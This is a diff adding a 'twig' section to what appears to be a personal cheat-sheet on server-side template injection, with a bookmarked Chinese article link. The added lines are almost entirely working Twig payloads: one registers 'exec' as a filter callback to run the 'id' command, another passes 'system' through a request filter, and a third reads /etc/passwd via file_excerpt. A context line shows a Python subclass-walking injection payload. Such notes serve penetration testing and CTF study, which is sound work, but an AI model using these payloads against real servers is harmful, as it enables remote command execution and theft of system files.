@@ -137,3 +137,26 @@ for item in "".__class__.__mro__[-1].__subclasses__():
         continue
 ```
 
+
+
+## twig
+
+### 收藏
+
+ [https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#2-Twig](https://www.k0rz3n.com/2018/11/12/一篇文章带你理解漏洞之SSTI漏洞/#2-Twig) 
+
+### payload
+
+```
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+```
+
+
+
+```
+{{app.request.request.get('name')}}
+{{app.request.query.filter(0,0,1024,{'options':'system'})}} 
+{{'/etc/passwd'|file_excerpt(1,30)}}
+
+```
+
